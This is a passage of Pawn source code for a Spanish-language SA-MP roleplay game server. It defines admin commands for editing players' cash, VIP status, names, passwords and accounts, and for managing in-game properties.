	SendClientMessageEx(playerid, COLOR_WHITE, "La experiencia de %s (%d) en el trabajo '%s' ahora es %d.", ACCOUNT_INFO[to_player][ac_NAME], to_player, work_info[ work ][work_info_NAME], exp);

	SendCmdLogToAdmins(playerid, "setworkexp", params);
	return 1;
}

CMD:setcash(playerid, params[])
{
	if ((gettime() - PLAYER_TEMP[playerid][py_ADMIN_DELAY]) < 10) return SendClientMessage(playerid, COLOR_WHITE, "Tienes que esperar 30 segundos para usar un comando de este tipo.");

	new to_player, value;
	if (sscanf(params, "ud", to_player, value)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setcash <player_id> <ammount>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "setcash");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	SetPlayerCash(to_player, value);
	SendClientMessageEx(playerid, COLOR_WHITE, "El dinero de %s (%d) ahora es %d.", ACCOUNT_INFO[to_player][ac_NAME], to_player, value);

	SendCmdLogToAdmins(playerid, "setcash", params);
	PLAYER_TEMP[playerid][py_ADMIN_DELAY] = gettime();
	return 1;
}

CMD:givecash(playerid, params[])
{
	if ((gettime() - PLAYER_TEMP[playerid][py_ADMIN_DELAY]) < 10) return SendClientMessage(playerid, COLOR_WHITE, "Tienes que esperar 30 segundos para usar un comando de este tipo.");

	new to_player, value;
	if (sscanf(params, "ud", to_player, value)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /givecash <player_id> <ammount>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "givecash");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	GivePlayerCash(to_player, value);
	SendClientMessageEx(playerid, COLOR_WHITE, "El jugador %s (%d) ha recibido %d.", ACCOUNT_INFO[to_player][ac_NAME], to_player, value);
	SendClientMessageEx(to_player, COLOR_WHITE, "El administrador %s (%d) te ha dado %d.", ACCOUNT_INFO[playerid][ac_NAME], playerid, value);

	SendCmdLogToAdmins(playerid, "givecash", params);
	PLAYER_TEMP[playerid][py_ADMIN_DELAY] = gettime();
	return 1;
}

CMD:setbmlevel(playerid, params[])
{
	new to_player, value;
	if (sscanf(params, "ud", to_player, value)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setbmlevel <player_id> <level>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);
	if (ACCOUNT_INFO[to_player][ac_ADMIN_LEVEL] > ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL])
	{
		SendCommandAlert(playerid, to_player, "setbmlevel");
		SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
		return 1;
	}

	CHARACTER_INFO[to_player][ch_BLACK_MARKET_LEVEL] = value;
	SendClientMessageEx(playerid, COLOR_WHITE, "El nivel 'black_market' de %s (%d) ahora es %d.", ACCOUNT_INFO[to_player][ac_NAME], to_player, value);

	SendCmdLogToAdmins(playerid, "setbmlevel", params);
	return 1;
}

CMD:asay(playerid, params[])
{
	if (isnull(params)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /asay <message>");
	new str[264];
	format(str, 264, "[Anuncio]"COL_WHITE" Admin %s: (( %s ))", ACCOUNT_INFO[playerid][ac_NAME], params);
	SendClientMessageToAll(0x717ebeFF, str);

	SendCmdLogToAdmins(playerid, "asay", params);
	return 1;
}

CMD:setworld(playerid, params[])
{
    new to_player, world;
    if (sscanf(params, "ud", to_player, world)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setworld <player_id> <world>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

	SetPlayerVirtualWorld(to_player, world);
	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador '%s (%d)' fue al mundo %d.", ACCOUNT_INFO[to_player][ac_NAME], to_player, world);
	SendCmdLogToAdmins(playerid, "setworld", params);
    return 1;
}

CMD:setinterior(playerid, params[])
{
    new to_player, interior;
    if (sscanf(params, "ud", to_player, interior)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setworld <player_id> <interior>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

	SetPlayerInterior(to_player, interior);
	SendClientMessageEx(playerid, COLOR_WHITE, "Jugador '%s (%d)' fue al interior %d.", ACCOUNT_INFO[to_player][ac_NAME], to_player, interior);
	SendCmdLogToAdmins(playerid, "setinterior", params);
    return 1;
}

CMD:lpos(playerid, params[])
{
	new Float:p[4], interior, vw;
	if (sscanf(params, "p<,>ffffdd", p[0], p[1], p[2], p[3], interior, vw)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /lpos [X], [Y], [Z], [ANGLE], [INTERIOR], [VIRTUAL WORLD]");

	SetPlayerPosEx(playerid, p[0], p[1], p[2], p[3], interior, vw);
	return 1;
}

CMD:v(playerid, params[])
{
	new modelid, color1, color2;
	if (sscanf(params, "k<vehicle>D(0)D(0)", modelid, color1, color2)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /v <modelid/nombre> <color 1 = 0> <color 2 = 0>");
	if (modelid < 400 || modelid > 611 || !modelid || modelid >= 999) return SendClientMessage(playerid, COLOR_WHITE, "Modelo de veh�culo no v�lido. Usa el nombre o la ID de modelo.");
	if (color1 > 255 || color1 > 255) return SendClientMessage(playerid, COLOR_WHITE, "Color no v�lido.");
	
	if (modelid == 432)
	{
		if (ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] < CMD_LORD) return SendClientMessageEx(playerid, COLOR_ORANGE, "[Alerta]"COL_WHITE" No tienes permisos suficientes (%d).", modelid);
	}

	new Float:p[4];
	GetPlayerPos(playerid, p[0], p[1], p[2]);
	GetPlayerFacingAngle(playerid, p[3]);

	new vid = AddTestVehicle(false, modelid, p[0], p[1], p[2], p[3], color1, color2);
	LinkVehicleToInterior(vid, GetPlayerInterior(playerid));
	SetVehicleVirtualWorld(vid, GetPlayerVirtualWorld(playerid));
	PutPlayerInVehicleEx(playerid, vid, 0);

	if (PLAYER_MISC[playerid][MISC_RADIO_STATION] < 100)
		PlayAudioStreamForPlayer(playerid, RADIO_STATIONS[ PLAYER_MISC[playerid][MISC_RADIO_STATION] ][r_URL]);

	SendCmdLogToAdmins(playerid, "v", params);
	return 1;
}

CMD:dv(playerid, params[])
{
	new vehicleid = GetPlayerVehicleID(playerid);
	if (!vehicleid) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: no est�s en ning�n veh�culo de prueba.");
	if (GLOBAL_VEHICLES[vehicleid][gb_vehicle_TYPE] != VEHICLE_TYPE_TEST) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: no est�s en ning�n veh�culo de prueba.");
	
	HidePlayerSpeedoMeter(playerid);

	DestroyVehicleEx(vehicleid);
	SendClientMessage(playerid, COLOR_WHITE, "Veh�culo de prueba destruido.");
	return 1;
}

CMD:setname(playerid, params[])
{
	new to_player, new_name[24];
	if (sscanf(params, "us[24]", to_player, new_name)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setname <player_id> <nuevo nombre>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);

	new DBResult:Result, DB_Query[256], bool:used;
	format(DB_Query, sizeof DB_Query, "SELECT `ID` FROM `ACCOUNTS` WHERE `NAME` = '%q';", new_name);
	Result = db_query(Database, DB_Query);
	if (db_num_rows(Result)) used = true;
	db_free_result(Result);
	if (used) return SendClientMessageEx(playerid, COLOR_WHITE, "El nombre '%s' est� en uso.", new_name);

	strreplace(new_name, " ", "_");
	format(PLAYER_TEMP[to_player][py_NAME], 24, "%s", new_name);
	format(ACCOUNT_INFO[to_player][ac_NAME], 24, "%s", new_name);
	SetRolePlayNames(to_player);
	SetPlayerName(to_player, new_name);

	format(DB_Query, sizeof DB_Query, "UPDATE `ACCOUNTS` SET `NAME` = '%q' WHERE `ID` = '%d';", new_name, ACCOUNT_INFO[to_player][ac_ID]);
	db_free_result(db_query(Database, DB_Query));

	for(new i = 0; i != MAX_PROPERTIES; i ++)
	{
		if (!PROPERTY_INFO[i][property_VALID]) continue;
		if (PROPERTY_INFO[i][property_OWNER_ID] != ACCOUNT_INFO[to_player][ac_ID]) continue;

		new label_str[256], city[45], zone[45];
		GetPointZone(PROPERTY_INFO[i][property_EXT_X], PROPERTY_INFO[i][property_EXT_Y], city, zone);
		format
		(
			label_str,
			sizeof label_str,
			""COL_WHITE"\
				Propiedad en %s (%d)\n\
				Propietario:{35A7FF} %s\n\
			", zone, PROPERTY_INFO[i][property_ID], ACCOUNT_INFO[to_player][ac_NAME]
		);
		UpdateDynamic3DTextLabelText(PROPERTY_INFO[i][property_EXT_LABEL_ID], 0xF0F0F000, label_str);
	}

	SendClientMessageEx(to_player, COLOR_WHITE, ""COL_WHITE"Tu nombre ha sido cambiado a '%s'", new_name);
	SendClientMessageEx(playerid, COLOR_WHITE, "El nombre del jugador ha sido cambiado a '%s'", new_name);

	SendCmdLogToAdmins(playerid, "setname", params);
	return 1;
}

CMD:exproperty(playerid, params[])
{
	new id_property;
	if (sscanf(params, "d", id_property)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /exproperty <id>");
	if (id_property <= 0) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /exproperty < id > 0 >");

	new index = GetPropertyIndexByID(id_property);
	if (index == -1) return SendClientMessage(playerid, COLOR_WHITE, "PROPIEDAD ID no encontrada.");

	if (!PROPERTY_INFO[index][property_SOLD]) return SendClientMessage(playerid, COLOR_WHITE, "Esta propiedad ya est� en venta.");


	PROPERTY_INFO[ index ][property_SOLD] = false;
	PROPERTY_INFO[ index ][property_CREW] = false;
	PROPERTY_INFO[ index ][property_OWNER_ID] = 0;
	PROPERTY_INFO[ index ][property_CREW_ID] = 0;

	new city[45], zone[45];
	GetPointZone(PROPERTY_INFO[index][property_EXT_X], PROPERTY_INFO[index][property_EXT_Y], city, zone);
	format(PROPERTY_INFO[ index ][property_NAME], 24, "%s (%d)", zone, PROPERTY_INFO[ index ][property_ID]);

	new info[3];
	UpdateUnnocupiedPropertyLabel(index);

	DestroyDynamicPickup(PROPERTY_INFO[ index ][property_EXT_PICKUP_ID]);
	PROPERTY_INFO[ index ][property_EXT_PICKUP_ID] = INVALID_STREAMER_ID;

	PROPERTY_INFO[ index ][property_EXT_PICKUP_ID] = CreateDynamicPickup(1273, 1, PROPERTY_INFO[ index ][property_EXT_X], PROPERTY_INFO[ index ][property_EXT_Y], PROPERTY_INFO[ index ][property_EXT_Z], 0, PROPERTY_INFO[ index ][property_EXT_INTERIOR]);
	info[0] = PICKUP_TYPE_PROPERTY;
	info[1] = index; // Index
	info[2] = 2; // Pickup Exterior
	Streamer_SetArrayData(STREAMER_TYPE_PICKUP, PROPERTY_INFO[ index ][property_EXT_PICKUP_ID], E_STREAMER_EXTRA_ID, info);


	new DB_Query[350];
	format(DB_Query, sizeof(DB_Query), "DELETE FROM `PROPERTY_OWNER` WHERE `ID_PROPERTY` = '%d';", PROPERTY_INFO[ index ][property_ID]);
	db_free_result(db_query(Database, DB_Query));

	format(DB_Query, sizeof(DB_Query), "DELETE FROM `PROPERTY_TERRITORY` WHERE `ID_PROPERTY` = '%d';", PROPERTY_INFO[ index ][property_ID]);
	db_free_result(db_query(Database, DB_Query));

	SendClientMessageEx(playerid, COLOR_WHITE, "Propiedad (%d) expropiada.", PROPERTY_INFO[ index ][property_ID]);

	SendCmdLogToAdmins(playerid, "exproperty", params);
	return 1;
}

CMD:gotoproperty(playerid, params[])
{
	new int_type;
	if (sscanf(params, "d", int_type)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /gotoproperty <interior>");
	if (int_type < 0 || int_type >= sizeof PROPERTY_INTERIORS) return SendClientMessageEx(playerid, COLOR_WHITE, "Error, rango de interior: 0-%d", sizeof(PROPERTY_INTERIORS) - 1);

	SetPlayerPosEx(playerid, PROPERTY_INTERIORS[int_type][property_INT_X], PROPERTY_INTERIORS[int_type][property_INT_Y], PROPERTY_INTERIORS[int_type][property_INT_Z], PROPERTY_INTERIORS[int_type][property_INT_ANGLE], PROPERTY_INTERIORS[int_type][property_INT_INTERIOR], 0, false, true);
	return 1;
}
alias:gotoproperty("ircasa")

CMD:setpass(playerid, params[])
{
	new to_account, new_pass[MAX_PASS_LENGTH + 1];
	if (sscanf(params, "ds[19]", to_account, new_pass)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setpass <DB-ID> <pass>");

	new DBResult:Result, DB_Query[160];
	format(DB_Query, sizeof DB_Query, "SELECT `ID`, `NAME`, `CONNECTED`, `PLAYERID`, `ADMIN_LEVEL` FROM `ACCOUNTS` WHERE `ID` = '%d';", to_account);
	Result = db_query(Database, DB_Query);

	if (db_num_rows(Result))
	{
		new id, get_name[24], connected, player_id, admin_level;

		id = db_get_field_assoc_int(Result, "ID");
		db_get_field_assoc(Result, "NAME", get_name, 24);
		connected = db_get_field_assoc_int(Result, "CONNECTED");
		player_id = db_get_field_assoc_int(Result, "PLAYERID");
		admin_level = db_get_field_assoc_int(Result, "ADMIN_LEVEL");

		if (ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] >= admin_level)
		{
			if (connected) SendClientMessageEx(playerid, COLOR_WHITE, "JUGADOR '%s' DB-ID '%d' conectado, player_id: %d, no es necario cambiar la contrase�a.", get_name, id, player_id);
			else
			{
				new salt[16], salt_ex[16], pass_ex[64 + 1];
				getRandomSalt(salt);
				format(salt_ex, 16, "%s", salt);

				SHA256_PassHash(new_pass, salt_ex, pass_ex, 64 + 1);

				format(DB_Query, sizeof DB_Query, "UPDATE `ACCOUNTS` SET `SALT` = '%q', `PASS` = '%q' WHERE `ID` = '%d';", salt_ex, pass_ex, id);
				db_free_result(db_query(Database, DB_Query));

				SendClientMessageEx(playerid, COLOR_WHITE, "La contrase�a de '%s' ahora es: %s", get_name, new_pass);
			}
		}
		else SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
	}
	else SendClientMessage(playerid, COLOR_WHITE, "No se encontro la DB-ID.");
	db_free_result(Result);
	return 1;
}

CMD:getresponse(playerid, params[])
{
	new to_account;
	if (sscanf(params, "d", to_account)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /getresponse <DB-ID>");

	new DBResult:Result, DB_Query[160];

	// Security question
	format(DB_Query, sizeof(DB_Query), "SELECT * FROM `SECURITY_QUESTIONS` WHERE `ID_USER` = '%d';", to_account);
	Result = db_query(Database, DB_Query);

	if (db_num_rows(Result))
	{
		new response[60];
		db_get_field_assoc(Result, "RESPONSE", response, 32);
		SendClientMessageEx(playerid, COLOR_WHITE, "Respuesta: %s", response);
	}
	else SendClientMessage(playerid, COLOR_WHITE, "No se encontro la DB-ID.");
	db_free_result(Result);

	SendCmdLogToAdmins(playerid, "getresponse", params);
	return 1;
}

CMD:setip(playerid, params[])
{
	new to_account, new_ip[16];
	if (sscanf(params, "ds[16]", to_account, new_ip)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setip <DB-ID> <ip>");

	new DBResult:Result, DB_Query[160];
	format(DB_Query, sizeof DB_Query, "SELECT `ID`, `NAME`, `CONNECTED`, `PLAYERID`, `ADMIN_LEVEL` FROM `ACCOUNTS` WHERE `ID` = '%d';", to_account);
	Result = db_query(Database, DB_Query);

	if (db_num_rows(Result))
	{
		new id, get_name[24], connected, player_id, admin_level;

		id = db_get_field_assoc_int(Result, "ID");
		db_get_field_assoc(Result, "NAME", get_name, 24);
		connected = db_get_field_assoc_int(Result, "CONNECTED");
		player_id = db_get_field_assoc_int(Result, "PLAYERID");
		admin_level = db_get_field_assoc_int(Result, "ADMIN_LEVEL");

		if (ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] >= admin_level)
		{
			if (connected) SendClientMessageEx(playerid, COLOR_WHITE, "JUGADOR '%s' DB-ID '%d' conectado, no se puede cambiar.", get_name, id, player_id);
			else
			{
				format(DB_Query, sizeof DB_Query, "UPDATE `ACCOUNTS` SET `IP` = '%q' WHERE `ID` = '%d';", new_ip, id);
				db_free_result(db_query(Database, DB_Query));

				SendClientMessageEx(playerid, COLOR_WHITE, "La ip de '%s' ahora es: %s", get_name, new_ip);
			}
		}
		else SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
	}
	else SendClientMessage(playerid, COLOR_WHITE, "No se encontro la DB-ID.");
	db_free_result(Result);
	return 1;
}

CMD:delete(playerid, params[])
{
	new to_account;
	if (sscanf(params, "d", to_account)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /delete <DB-ID>");

	new DBResult:Result, DB_Query[160];
	format(DB_Query, sizeof DB_Query, "SELECT `ID`, `NAME`, `CONNECTED`, `PLAYERID`, `ADMIN_LEVEL` FROM `ACCOUNTS` WHERE `ID` = '%d';", to_account);
	Result = db_query(Database, DB_Query);

	if (db_num_rows(Result))
	{
		new id, get_name[24], connected, player_id, admin_level;

		id = db_get_field_assoc_int(Result, "ID");
		db_get_field_assoc(Result, "NAME", get_name, 24);
		connected = db_get_field_assoc_int(Result, "CONNECTED");
		player_id = db_get_field_assoc_int(Result, "PLAYERID");
		admin_level = db_get_field_assoc_int(Result, "ADMIN_LEVEL");

		if (ACCOUNT_INFO[playerid][ac_ADMIN_LEVEL] >= admin_level)
		{
			if (connected) SendClientMessageEx(playerid, COLOR_WHITE, "JUGADOR '%s' DB-ID '%d' conectado para eliminarlo debe estar desconectado, utilice /kick %d", get_name, id, player_id);
			else
			{
				format(DB_Query, sizeof DB_Query, "DELETE FROM `ACCOUNTS` WHERE `ID` = '%d';", id);
				db_free_result(db_query(Database, DB_Query));

				new ex_properties;
				for(new index = 0; index != MAX_PROPERTIES; index ++)
				{
					if (!PROPERTY_INFO[index][property_VALID]) continue;
					if (!PROPERTY_INFO[index][property_SOLD]) continue;
					if (PROPERTY_INFO[index][property_OWNER_ID] != id) continue;

					PROPERTY_INFO[ index ][property_SOLD] = false;
					PROPERTY_INFO[ index ][property_OWNER_ID] = 0;
					new city[45], zone[45];
					GetPointZone(PROPERTY_INFO[index][property_EXT_X], PROPERTY_INFO[index][property_EXT_Y], city, zone);
					format(PROPERTY_INFO[ index ][property_NAME], 24, "%s (%d)", zone, PROPERTY_INFO[ index ][property_ID]);

					new info[3];
					UpdateUnnocupiedPropertyLabel(index);

					DestroyDynamicPickup(PROPERTY_INFO[ index ][property_EXT_PICKUP_ID]);
					PROPERTY_INFO[ index ][property_EXT_PICKUP_ID] = INVALID_STREAMER_ID;

					PROPERTY_INFO[ index ][property_EXT_PICKUP_ID] = CreateDynamicPickup(1273, 1, PROPERTY_INFO[ index ][property_EXT_X], PROPERTY_INFO[ index ][property_EXT_Y], PROPERTY_INFO[ index ][property_EXT_Z], 0, PROPERTY_INFO[ index ][property_EXT_INTERIOR]);
					info[0] = PICKUP_TYPE_PROPERTY;
					info[1] = index; // Index
					info[2] = 2; // Pickup Exterior
					Streamer_SetArrayData(STREAMER_TYPE_PICKUP, PROPERTY_INFO[ index ][property_EXT_PICKUP_ID], E_STREAMER_EXTRA_ID, info);

					ex_properties ++;
				}

				SendClientMessageEx(playerid, COLOR_WHITE, "ACCOUNTS (Nombre '%s' DB-ID: '%d') ha sido eliminada.", get_name, id);
				if (ex_properties > 0) SendClientMessageEx(playerid, COLOR_WHITE, "Se han expropiado '%d' propiedades del jugador eliminado.", ex_properties);

				new str[145]; format(str, 145, "[ADMIN] %s (%d) ha eliminado el usuario '%s'", ACCOUNT_INFO[playerid][ac_NAME], playerid, get_name);
				SendMessageToAdmins(COLOR_ANTICHEAT, str);
			}
		}
		else SendClientMessage(playerid, COLOR_WHITE, "El rango administrativo de este jugador es superior al tuyo.");
	}
	else SendClientMessage(playerid, COLOR_WHITE, "No se encontr� la DB-ID.");
	db_free_result(Result);

	return 1;
}

CMD:rproperty(playerid, params[])
{
	new id_property;
	if (sscanf(params, "d", id_property)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /rproperty <id>");
	if (id_property <= 0) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /rproperty < id > 0 >");

	new index = GetPropertyIndexByID(id_property);
	if (index == -1) return SendClientMessage(playerid, COLOR_WHITE, "PROPIEDAD ID no encontrada.");

	new DB_Query[70];
	format(DB_Query, sizeof DB_Query, "DELETE FROM `PROPERTY` WHERE `ID` = '%d';", PROPERTY_INFO[index][property_ID]);
	db_free_result(db_query(Database, DB_Query));

	if (IsValidDynamic3DTextLabel(PROPERTY_INFO[index][property_EXT_LABEL_ID])) DestroyDynamic3DTextLabel(PROPERTY_INFO[index][property_EXT_LABEL_ID]);
	if (IsValidDynamicPickup(PROPERTY_INFO[index][property_EXT_PICKUP_ID])) DestroyDynamicPickup(PROPERTY_INFO[index][property_EXT_PICKUP_ID]);
	if (IsValidDynamicPickup(PROPERTY_INFO[index][property_INT_PICKUP_ID])) DestroyDynamicPickup(PROPERTY_INFO[index][property_INT_PICKUP_ID]);
	new reset[Property_Info_Enum]; PROPERTY_INFO[index] = reset;

	TOTAL_PROPERTIES_LOADED --;

	SendClientMessageEx(playerid, COLOR_WHITE, "PROPIEDAD %d ELIMINADA.", id_property);
	SendClientMessageEx(playerid, COLOR_WHITE, "PROPIEDADES: %d/%d", TOTAL_PROPERTIES_LOADED, MAX_PROPERTIES);

	SendCmdLogToAdmins(playerid, "rproperty", params);
	return 1;
}

CMD:eproperty(playerid, params[])
{
	new id_property, new_int;
	if (sscanf(params, "dddddd", id_property, new_int, PLAYER_TEMP[playerid][py_PROPERTY_CINFO][0], PLAYER_TEMP[playerid][py_PROPERTY_CINFO][1], PLAYER_TEMP[playerid][py_PROPERTY_CINFO][2], PLAYER_TEMP[playerid][py_PROPERTY_CINFO][3])) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /eproperty <id> <interior> <nivel> <precio> <VIP level> <vulcoins>");
	if (id_property <= 0) return SendClientMessage(playerid, COLOR_WHITE, "ID no v�lida.");

	new index = GetPropertyIndexByID(id_property);
	if (index == -1) return SendClientMessage(playerid, COLOR_WHITE, "PROPIEDAD ID no encontrada.");

	if (PROPERTY_INFO[index][property_SOLD]) return SendClientMessage(playerid, COLOR_WHITE, "Solo se pueden modificar propiedades que est�n libres.");

	if (new_int < 0 || new_int >= sizeof(PROPERTY_INTERIORS)) return SendClientMessage(playerid, COLOR_WHITE, "El interior elegido no es v�lido.");

	PROPERTY_INFO[index][property_ID_INTERIOR] = new_int;
	PROPERTY_INFO[index][property_PRICE] = PLAYER_TEMP[playerid][py_PROPERTY_CINFO][1];
	PROPERTY_INFO[index][property_LEVEL] = PLAYER_TEMP[playerid][py_PROPERTY_CINFO][0];
	PROPERTY_INFO[index][property_EXTRA] = PLAYER_TEMP[playerid][py_PROPERTY_CINFO][3];
	PROPERTY_INFO[index][property_VIP_LEVEL] = PLAYER_TEMP[playerid][py_PROPERTY_CINFO][2];
	PROPERTY_INFO[index][property_PRICE_BASE] = floatround(floatdiv(PROPERTY_INFO[index][property_PRICE], MULTIPLIER_PROPERITES));

	if (PROPERTY_INFO[index][property_EXTRA]) PROPERTY_INFO[index][property_PRICE] = 0;
	if (PROPERTY_INFO[index][property_VIP_LEVEL]) PROPERTY_INFO[index][property_LEVEL] = 1;

	UpdateUnnocupiedPropertyLabel(index);

	new DB_Query[512];
	format(DB_Query, sizeof DB_Query,

		"\
		UPDATE `PROPERTY` SET `ID_INTERIOR` = '%d' WHERE `ID` = '%d';\
		UPDATE `PROPERTY_INFO` SET \
			`PRICE` = '%d',\
			`LEVEL` = '%d',\
			`EXTRA` = '%d',\
			`VIP_LEVEL` = '%d' \
		WHERE `ID_PROPERTY` = '%d';",
			PROPERTY_INFO[index][property_ID_INTERIOR],
			PROPERTY_INFO[index][property_ID],

			PROPERTY_INFO[index][property_PRICE_BASE],
			PROPERTY_INFO[index][property_LEVEL],
			PROPERTY_INFO[index][property_EXTRA],
			PROPERTY_INFO[index][property_VIP_LEVEL],
			PROPERTY_INFO[index][property_ID]
	);
	db_free_result(db_query(Database, DB_Query));

	SendCmdLogToAdmins(playerid, "eproperty", params);
	return 1;
}

CMD:cproperty(playerid, params[])
{
	if (TOTAL_PROPERTIES_LOADED >= MAX_PROPERTIES) return SendClientMessage(playerid, COLOR_WHITE, "L�mite alcanzado.");

	if (sscanf(params, "dddd", PLAYER_TEMP[playerid][py_PROPERTY_CINFO][0], PLAYER_TEMP[playerid][py_PROPERTY_CINFO][1], PLAYER_TEMP[playerid][py_PROPERTY_CINFO][2], PLAYER_TEMP[playerid][py_PROPERTY_CINFO][3])) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /cproperty <nivel> <precio> <level> <vulcoins>");

	GetPlayerPos(playerid, PLAYER_PROPERTY_CONSTRUCTOR[playerid][player_property_creator_EXT_X], PLAYER_PROPERTY_CONSTRUCTOR[playerid][player_property_creator_EXT_Y], PLAYER_PROPERTY_CONSTRUCTOR[playerid][player_property_creator_EXT_Z]);
	GetPlayerFacingAngle(playerid, PLAYER_PROPERTY_CONSTRUCTOR[playerid][player_property_creator_EXT_ANG]);
	PLAYER_PROPERTY_CONSTRUCTOR[playerid][player_property_creator_EXT_INT] = GetPlayerInterior(playerid);

	PLAYER_PROPERTY_CONSTRUCTOR[playerid][player_property_creator_ENABLED] = true;
	for(new i = 0; i != 6; i ++) PlayerTextDrawShow(playerid, PlayerTextdraws[playerid][ptextdraw_PROPERTY_CONSTRUCTOR][i]);

	UpdatePlayerPropertyContructor(playerid);
	return 1;
}

CMD:eco(playerid, params[])
{
	ShowDialog(playerid, DIALOG_SERVER_ECO);
	return 1;
}

CMD:setearsu(playerid, params[])
{
	if ((gettime() - PLAYER_TEMP[playerid][py_ADMIN_DELAY]) < 10) return SendClientMessage(playerid, COLOR_WHITE, "Tienes que esperar 30 segundos para usar un comando de este tipo.");

	new to_player, sd;
	if (sscanf(params, "ud", to_player, sd)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setearsu <player_id> <sd>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);

	ACCOUNT_INFO[to_player][ac_SD] = sd;
	SendClientMessageEx(to_player, COLOR_WHITE, ""COL_WHITE"Ahora tienes %d "SERVER_COIN".", sd);
	PlayerPlaySoundEx(to_player, 1058, 0.0, 0.0, 0.0);

	new DB_Query[128];
	format(DB_Query, sizeof DB_Query, "UPDATE `ACCOUNTS` SET `SD` = '%d' WHERE `ID` = '%d';", ACCOUNT_INFO[to_player][ac_SD], ACCOUNT_INFO[to_player][ac_ID]);
	db_free_result(db_query(Database, DB_Query));

	SendCmdLogToAdmins(playerid, "setearsu", params);
	PLAYER_TEMP[playerid][py_ADMIN_DELAY] = gettime();
	return 1;
}

CMD:darsu(playerid, params[])
{
	if ((gettime() - PLAYER_TEMP[playerid][py_ADMIN_DELAY]) < 10) return SendClientMessage(playerid, COLOR_WHITE, "Tienes que esperar 30 segundos para usar un comando de este tipo.");

	new to_player, sd;
	if (sscanf(params, "ud", to_player, sd)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /darsu <player_id> <sd>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);

	ACCOUNT_INFO[to_player][ac_SD] += sd;
	SendClientMessageEx(to_player, COLOR_WHITE, ""COL_WHITE"Has comprado %d "SERVER_COIN".", sd);
	PlayerPlaySoundEx(to_player, 1058, 0.0, 0.0, 0.0);

	new DB_Query[128];
	format(DB_Query, sizeof DB_Query, "UPDATE `ACCOUNTS` SET `SD` = '%d' WHERE `ID` = '%d';", ACCOUNT_INFO[to_player][ac_SD], ACCOUNT_INFO[to_player][ac_ID]);
	db_free_result(db_query(Database, DB_Query));

	SendCmdLogToAdmins(playerid, "setsd", params);
	PLAYER_TEMP[playerid][py_ADMIN_DELAY] = gettime();
	return 1;
}

CMD:darvip(playerid, params[])
{
	if ((gettime() - PLAYER_TEMP[playerid][py_ADMIN_DELAY]) < 10) return SendClientMessage(playerid, COLOR_WHITE, "Tienes que esperar 30 segundos para usar un comando de este tipo.");

	new to_player, vip_level, days;
	if (sscanf(params, "udd", to_player, vip_level, days)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setvip <player_id> <VIP level> <dias>");
	if (!IsPlayerConnected(to_player)) return SendClientMessageEx(playerid, COLOR_WHITE, "Jugador (%d) desconectado", to_player);

	SetPlayerVip(to_player, vip_level, 0, days);

	SendCmdLogToAdmins(playerid, "setvip", params);
	PLAYER_TEMP[playerid][py_ADMIN_DELAY] = gettime();
	return 1;
}

CMD:darskin(playerid, params[])
{
    new to_player, skin;
    if (sscanf(params, "ud", to_player, skin)) return SendClientMessage(playerid, COLOR_WHITE, "Syntax: /setskin <player_id> <skin>");
    if (!IsPlayerConnected(to_player)) return SendClientMessage(playerid, COLOR_WHITE, "Jugador desconectado");

	CHARACTER_INFO[to_player][ch_SKIN] = skin;
    SetPlayerSkin(to_player, CHARACTER_INFO[to_player][ch_SKIN]);
